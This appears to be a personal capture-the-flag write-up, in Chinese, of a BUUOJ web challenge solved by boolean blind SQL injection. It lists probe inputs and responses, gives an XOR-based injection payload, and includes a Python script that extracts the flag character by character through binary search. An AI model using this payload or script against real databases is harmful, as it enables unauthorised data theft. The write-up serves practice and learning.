![[Pasted image 20221108085601.png|500]]

![[Pasted image 20221108085629.png]]

```php
id=1
```
> Hello, glzjin wants a girlfriend.


```php
id=2
```
> Do you want to be my girlfriend?


```php
id=3
```
> Error Occured When Fetch Result.

```php
id=0
```
> Error Occured When Fetch Result.


```php
id=1; show databases#
```
> SQL Injection Checked.

```php
id=abc
```
> bool(false)

搜索得知这题是传说中的布尔盲注

通过上面的尝试可知，对`id`的运算结果为`1`或`2`时返回对应的字符串，为其他数字时返回错误，为非数字时返回false，因此可利用这一点逐个判断出flag的每一个字符
```sql
id=0^(ascii(substr((select(flag)from(flag)),/*index*/,1))>/*特定值*/)
```
若后面的比较为真，则`0^1`为`1`，返回`Hello, glzjin wants a girlfriend.`

否则`0^0`为`0`，报错

通过`python`脚本来二分（顺便学下`requests`怎么用QwQ）
```python
import requests

url = 'http://b405dc5e-a9fb-4e52-9d5d-f10a343e2bbd.node4.buuoj.cn:81/index.php'

for i in range(1, 100):
    a = 0
    b = 127
    while a < b:
        mid = (a + b) // 2
        r = requests.post(
            url,
            data={'id':'0^(ascii(substr((select(flag)from(flag)),{},1))>={})'.format(i, mid)})
        if r.content[-2:] == b't.':
            b = mid
        else:
            a = mid + 1

    print(chr(a-1),sep='',end='',flush=True)

```
![[Pasted image 20221108173940.png]]

#Web #SQL注入 #布尔盲注